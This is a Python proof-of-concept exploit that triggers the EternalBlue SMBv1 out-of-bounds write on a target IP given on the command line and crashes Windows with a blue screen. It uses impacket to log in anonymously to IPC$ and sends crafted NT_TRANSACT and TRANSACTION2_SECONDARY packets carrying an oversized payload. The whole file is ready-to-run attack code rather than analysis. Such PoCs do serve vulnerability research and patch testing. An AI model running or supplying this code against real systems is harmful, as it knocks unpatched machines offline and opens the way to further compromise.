from impacket import smb
from struct import pack
import sys

'''
PoC for trigger EternalBlue bug (BSOD)

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
'''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

TARGET=sys.argv[1]

def sendEcho(tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB()


# Note: impacket struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# Note: assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_nt_trans(tid, setup, data, param, firstDataCnt):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataCnt
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataCnt]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	
	i = firstDataCnt
	while i < len(data):
		sendSize = min(4096, len(data) - i)
		send_trans2_second(tid, data[i:i+sendSize], i)
		i += sendSize
	
	conn.recvSMB()
	

# force using smb.SMB for SMB1
conn = smb.SMB(TARGET, TARGET)

# can use conn.login() for ntlmv2
conn.login_standard('', '')

tid = conn.tree_connect_andx('\\\\'+TARGET+'\\'+'IPC$')

# OOB write ~0x8c00 for BSOD
payload = pack('<I', 0x10000)
payload += pack('<BBH', 0, 0, 0xc003)
payload += 'A'*0xc004
payload += pack('<BBH', 0, 0, 0xcc00)
payload = payload.ljust(0x10000+976, 'B')

send_nt_trans(tid, 0, payload, '\x00'*30, 976)

